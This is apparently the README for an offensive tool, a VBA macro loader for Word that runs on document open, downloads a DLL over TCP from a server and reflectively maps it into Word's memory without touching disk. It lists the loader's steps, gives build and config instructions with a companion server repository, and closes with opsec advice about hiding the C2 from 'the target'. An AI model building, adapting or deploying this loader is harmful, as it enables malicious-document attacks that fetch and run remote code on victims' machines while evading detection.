# Reflective DLL Loader (VBA)

Downloads a DLL over TCP and manually maps it in Word's process — no file touches disk.

## What's here

- `ReflectiveLoader_Standalone.bas` — the VBA loader (paste into a standard module)
- `ThisDocument.txt` — Document_Open hook to trigger on file open

## What you also need

The loader expects a running **DLL server** and a **DLL built with a reflective loader export**. A basic implementation example - [NetReflectiveInjector](https://github.com/0xntpower/NetReflectiveInjector):

```
git clone https://github.com/0xntpower/NetReflectiveInjector.git
```

Build two things (VS2022, x64 Release):

1. **DllServer** (`DllServer/DllServer.sln`) — TCP server that sends raw DLL bytes on connect, port 2843
2. **ReflectiveDll** (`ReflectiveDll/ReflectiveDll.sln`) — test DLL that pops a MessageBox on load

Then run:

```
DllServer.exe ReflectiveDll.dll
```

Open the Word doc with the macro. The VBA connects to `127.0.0.1:2843`, receives the DLL, maps it, and calls DllMain. The MessageBox confirms it worked.

## How the VBA loader works

1. Winsock connect + recv loop — DLL bytes land in a VBA byte array
2. Parse PE headers from the array (DOS → NT → section table)
3. `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` for the full image
4. Copy PE headers and each section to their virtual addresses
5. Walk the base relocation table, apply delta fixups
6. Walk the import directory, resolve each thunk via `LoadLibraryA` + `GetProcAddress`
7. `CallWindowProcW` as a trampoline to call `DllMain(base, DLL_PROCESS_ATTACH, 0)`

## Config

Edit the constants at the top of the `.bas` file:

```vba
Private Const SERVER_HOST As String = "127.0.0.1"
Private Const SERVER_PORT As Long = 2843
```

## Note
This approach directly exposes your C2 as raw code in the Word macro that you directly provide to the target which is horrible in terms of opsec.
Probably worth considering changing the approach in how you receieve your reflective DLL payload bytes.
